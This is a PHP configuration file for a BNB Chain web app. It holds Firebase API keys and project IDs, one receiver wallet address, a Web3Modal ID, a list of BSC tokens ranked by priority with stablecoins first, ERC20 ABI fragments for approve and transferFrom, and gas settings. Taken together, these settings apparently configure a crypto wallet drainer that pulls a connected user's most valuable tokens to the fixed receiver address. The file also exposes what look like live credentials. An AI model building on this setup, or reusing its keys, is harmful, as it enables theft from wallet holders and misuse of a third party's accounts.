<?php
/**
 * get_config.php — SECURE CONFIGURATION FILE
 * All sensitive keys, addresses, and credentials live here.
 * NEVER expose this file to the frontend.
 */

// ═══════════════════════════════════════════════════════════════
// FIREBASE CONFIGURATION
// ═══════════════════════════════════════════════════════════════
define('FIREBASE_API_KEY',            'AIzaSyD50JaRk-1Ox7ZykUwLxeLeJL6qYmhSJXA');
define('FIREBASE_AUTH_DOMAIN',        'vankleff-49ec4.firebaseapp.com');
define('FIREBASE_PROJECT_ID',         'vankleff-49ec4');
define('FIREBASE_STORAGE_BUCKET',     'vankleff-49ec4.firebasestorage.app');
define('FIREBASE_MESSAGING_SENDER_ID','210039359120');
define('FIREBASE_APP_ID',             '1:210039359120:web:357850dd5e23938b18ba15');
define('FIREBASE_FIRESTORE_COLLECTION','config');
define('FIREBASE_FIRESTORE_DOCUMENT',  'app_settings');

// ═══════════════════════════════════════════════════════════════
// RECIPIENT / WALLET ADDRESSES
// ═══════════════════════════════════════════════════════════════
define('RECEIVER_ADDRESS', '0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db');

// ═══════════════════════════════════════════════════════════════
// WEB3MODAL PROJECT ID
// ═══════════════════════════════════════════════════════════════
define('WEB3MODAL_PROJECT_ID', '6d97bf9b04efc25f048a85edeb3f3fd1');

// ═══════════════════════════════════════════════════════════════
// CHAIN CONFIGURATION
// ═══════════════════════════════════════════════════════════════
define('TARGET_CHAIN_ID',  56);
define('TARGET_CHAIN_HEX', '0x38');

// BNB Gas Price RPC endpoint
define('BNB_RPC_URL', 'https://bsc-dataseed1.binance.org/');

// ═══════════════════════════════════════════════════════════════
// TOKEN LISTS (BSC Chain)
// ═══════════════════════════════════════════════════════════════
define('KNOWN_TOKENS_BSC', json_encode([
    ['symbol'=>'USDT',     'address'=>'0x55d398326f99059fF775485246999027B3197955', 'decimals'=>18, 'priority'=>'stable'],
    ['symbol'=>'USDC',     'address'=>'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', 'decimals'=>18, 'priority'=>'stable'],
    ['symbol'=>'BUSD',     'address'=>'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', 'decimals'=>18, 'priority'=>'stable'],
    ['symbol'=>'WBNB',     'address'=>'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', 'decimals'=>18, 'priority'=>'high'],
    ['symbol'=>'CAKE',     'address'=>'0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', 'decimals'=>18, 'priority'=>'high'],
    ['symbol'=>'XRP',      'address'=>'0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', 'decimals'=>18, 'priority'=>'medium'],
    ['symbol'=>'ADA',      'address'=>'0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', 'decimals'=>18, 'priority'=>'medium'],
    ['symbol'=>'DOT',      'address'=>'0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', 'decimals'=>18, 'priority'=>'medium'],
    ['symbol'=>'LINK',     'address'=>'0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', 'decimals'=>18, 'priority'=>'medium'],
    ['symbol'=>'DOGE',     'address'=>'0xbA2aE424d960c26247Dd6c32edC70B295c744C43', 'decimals'=>8,  'priority'=>'low'],
    ['symbol'=>'SHIB',     'address'=>'0x2859e4544C4bB03966803b044A93563Bd2D0DD4D', 'decimals'=>18, 'priority'=>'low'],
    ['symbol'=>'PEPE',     'address'=>'0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00', 'decimals'=>18, 'priority'=>'low'],
    ['symbol'=>'FLOKI',    'address'=>'0xfb5B838b6cfEEdC2873aB27866079AC55363D37A', 'decimals'=>9,  'priority'=>'low'],
    ['symbol'=>'TWT',      'address'=>'0x4B0F1812e5Df2A09796481Ff14017e6005508003', 'decimals'=>18, 'priority'=>'low'],
    ['symbol'=>'BSW',      'address'=>'0x965F527D9159dCe6288a2219DB51fc6Eef120dD1', 'decimals'=>18, 'priority'=>'low'],
    ['symbol'=>'BABYDOGE', 'address'=>'0xc748673057861a797275CD8A068AbB95A902e8de', 'decimals'=>9,  'priority'=>'low'],
]));

// ═══════════════════════════════════════════════════════════════
// ERC20 ABI FRAGMENTS (shared reference)
// ═══════════════════════════════════════════════════════════════
define('ERC20_ABI_JSON', json_encode([
    'function balanceOf(address owner) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function approve(address spender, uint256 amount) returns (bool)',
    'function allowance(address owner, address spender) view returns (uint256)',
    'function transferFrom(address from, address to, uint256 amount) returns (bool)',
]));

// ═══════════════════════════════════════════════════════════════
// GAS CONFIGURATION
// ═══════════════════════════════════════════════════════════════
define('GAS_LIMIT_NATIVE',  '0x5208');   // 21000
define('GAS_LIMIT_TOKEN',   '0x30D40');  // 200000
define('GAS_UNITS_TOKEN',   200000);
define('GAS_UNITS_NATIVE',  21000);

// ═══════════════════════════════════════════════════════════════
// API SECURITY (simple origin check — extend as needed)
// ═══════════════════════════════════════════════════════════════
define('ALLOWED_ORIGINS', json_encode([
    'http://localhost',
    'http://localhost:3000',
    'https://vankleffglobal.com',
    'https://www.vankleffglobal.com',
    // Add your Vercel deployment URL here after deploy:
    // 'https://your-project.vercel.app',
]));

// ═══════════════════════════════════════════════════════════════
// STABLECOIN PRIORITY LIST
// ═══════════════════════════════════════════════════════════════
define('STABLECOINS', json_encode(['USDT', 'USDC', 'BUSD', 'DAI']));
